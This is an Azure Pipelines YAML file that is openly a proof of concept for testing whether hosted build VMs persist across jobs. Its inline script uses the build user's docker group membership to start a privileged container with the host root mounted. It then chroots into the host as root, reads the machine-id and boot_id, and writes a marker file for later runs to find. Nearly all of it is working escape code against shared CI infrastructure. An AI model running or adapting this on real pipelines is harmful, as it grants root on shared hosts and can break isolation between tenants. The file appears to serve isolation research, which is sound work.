# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: PersistenceProof
  displayName: 'Final PoC: Test for Cross-Job VM Persistence'
  jobs:
  - job: Host_Persistence_Test
    displayName: 'PoC: Leave and Check for a Persistent Marker'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Capture Host Fingerprint and Test for Persistence'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts
          # Define the marker file path relative to the host's filesystem
          HOST_MARKER_FILE="/tmp/persistent_marker.txt"

          echo "--- CAPTURING JOB START TIME ---"
          JOB_START_SECONDS=$(date -u +%s)
          echo "Job started at: $(date -u -d @$JOB_START_SECONDS +'%Y-%m-%d %H:%M:%S UTC')" | tee artifacts/forensic-timeline.txt

          echo "--- VERIFYING CONTAINER ESCAPE VECTOR ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            exit 1
          fi
          echo "✅ Confirmed: Container escape vector is present."

          echo "--- ESCAPING CONTAINER TO PERFORM HOST FORENSICS ---"
          
          docker run --rm --privileged --pid=host -v /:/hostfs \
            alpine:latest sh -c "
              # We are now running as root inside a container with the host's filesystem mounted at /hostfs
              # All commands must be prefixed with 'chroot /hostfs' to run on the host itself.
              
              echo '--- [HOST] Capturing stable host fingerprints... ---'
              # Create a directory on the host for our results
              chroot /hostfs mkdir -p /tmp/scan_results

              (
                echo -n 'machine-id: '
                chroot /hostfs cat /etc/machine-id
                echo -n 'boot_id: '
                chroot /hostfs cat /proc/sys/kernel/random/boot_id
              ) > /hostfs/tmp/scan_results/host-fingerprint.txt

              echo '--- [HOST] Checking for residual marker from a PREVIOUS run... ---'
              if chroot /hostfs [ -f \"${HOST_MARKER_FILE}\" ]; then
                echo '✅✅✅ SMOKING GUN: RESIDUAL MARKER FOUND' > /hostfs/tmp/scan_results/persistence_verdict.txt
                echo 'Contents of the marker from the previous run:' >> /hostfs/tmp/scan_results/persistence_verdict.txt
                chroot /hostfs cat \"${HOST_MARKER_FILE}\" >> /hostfs/tmp/scan_results/persistence_verdict.txt
              else
                echo 'ℹ️ Marker not found, host appears to be fresh.' > /hostfs/tmp/scan_results/persistence_verdict.txt
              fi

              echo '--- [HOST] Creating a new marker for the NEXT run... ---'
              chroot /hostfs sh -c '
                (
                  echo \"Marker created by Build Number: ${BUILD_BUILDNUMBER}\"
                  echo \"Timestamp (UTC): \$(date -u +\"%Y-%m-%d %H:%M:%S\")\"
                ) > \"${HOST_MARKER_FILE}\"
              '
              echo \"Successfully created ${HOST_MARKER_FILE} for a future run to find.\"
            "
          
          # Copy the results from the host's temp directory back into the pipeline's artifact staging directory
          sudo cp /tmp/scan_results/* artifacts/
          sudo rm -rf /tmp/scan_results

          echo "--- ANALYSIS & VERDICT ---"
          cat artifacts/persistence_verdict.txt

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Persistence Test Artifacts'
      condition: always()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-persistence-proof-run-$(System.JobAttempt)'
